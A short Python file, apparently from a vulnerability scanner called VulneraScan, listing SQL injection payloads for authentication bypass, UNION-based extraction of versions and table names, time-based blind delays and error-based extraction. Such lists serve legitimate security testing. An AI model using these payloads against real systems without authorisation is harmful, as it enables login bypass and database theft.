# SQL injection payloads for VulneraScan
# SQL Injection Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",                # Basic authentication bypass
    "' OR '1'='1' --",
    "' AND 1=0 --",               # False condition
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, version() --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' AND SLEEP(5) --",          # MySQL/PostgreSQL delay
    "'; WAITFOR DELAY '0:0:5' --",# SQL Server delay
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --", # MySQL error-based
    "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1))x) --",
]